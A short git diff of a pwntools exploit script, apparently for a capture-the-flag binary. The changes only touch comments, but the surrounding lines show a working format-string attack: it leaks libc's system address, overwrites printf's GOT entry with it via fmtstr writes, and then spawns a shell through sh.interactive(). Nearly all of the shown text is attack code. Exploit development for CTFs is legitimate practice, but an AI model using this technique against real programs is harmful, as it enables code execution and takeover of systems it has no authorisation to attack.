@@ -64,6 +64,8 @@ log.success('Leaked libc system address --> %#0x', leaked_libc_system)
 ## 2nd method use (since we want to get the offset automatically)
 ## REFERENCE --> https://docs.pwntools.com/en/stable/fmtstr.html
 
+# option local
+
 def send_payload(payload): # can determine the correct offset and send our payload auto.
     sh.sendlineafter(b'>', b'1')
     sh.sendlineafter(b'>', payload)
@@ -101,6 +103,6 @@ format_str.write(printf_got_addr, libc_system_binary)
 format_str.execute_writes() # perform the writes
 
 sh.sendline(b'2') # go to second menu
-sh.sendline(b'sh') # run shell
+sh.sendline(b'sh') # run shell # can't /bin/sh\x00
 
 sh.interactive()
